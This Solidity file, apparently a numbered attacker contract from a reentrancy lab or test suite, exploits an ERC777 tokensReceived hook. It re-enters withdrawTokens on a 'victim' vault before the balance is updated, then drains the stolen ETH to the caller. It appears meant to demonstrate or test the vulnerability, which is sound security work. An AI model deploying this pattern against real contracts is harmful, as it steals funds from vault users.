// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ERC777VaultVictim.sol";

/**
 * Attacker4_ERC777
 * ERC777 tokensReceived hook reentrancy.
 * Registers as a hook recipient, then during the hook callback
 * re-enters withdrawTokens() before the balance is decremented.
 */
contract Attacker4_ERC777 is ITokensReceived {
    ERC777VaultVictim public target;
    bool public hookActive;
    uint256 public hookCallCount;

    constructor(address _target) {
        target = ERC777VaultVictim(payable(_target));
    }

    function setup() external {
        // Register this contract as a tokensReceived hook recipient
        target.registerHook();
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need ETH");
        target.depositTokens{value: msg.value}();
        hookActive = true;
        target.withdrawTokens(msg.value);
        hookActive = false;
    }

    // Called by ERC777VaultVictim before balance update
    function tokensReceived(address /*vault*/, uint256 amount) external override {
        hookCallCount++;
        if (hookActive && hookCallCount == 1) {
            // Re-enter withdrawTokens — balance not yet decremented
            target.withdrawTokens(amount);
        }
    }

    receive() external payable {}

    function drain() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
